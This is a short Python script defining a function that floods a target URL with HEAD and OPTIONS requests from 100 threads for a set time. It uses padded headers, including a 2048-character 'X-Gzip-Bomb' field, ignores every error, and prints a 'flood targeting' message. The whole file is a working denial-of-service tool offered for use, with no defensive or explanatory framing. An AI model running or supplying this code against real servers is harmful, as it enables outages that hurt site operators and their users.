import threading, time, requests, random

def flood_linux(target, duration=60, threads=100):
    methods = ["HEAD", "OPTIONS"]
    headers = {
        "User-Agent": "curl/7.68.0",
        "Accept-Encoding": "gzip;q=1.0, deflate;q=0.8, *;q=0.1",
        "X-Gzip-Bomb": "A" * 2048,
        "Connection": "Keep-Alive",
    }

    def attack_loop():
        end = time.time() + duration
        while time.time() < end:
            try:
                method = random.choice(methods)
                requests.request(method, target, headers=headers, timeout=2)
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=attack_loop).start()

    print(f"💥 Linux flood targeting {target} for {duration}s with {threads} threads.")
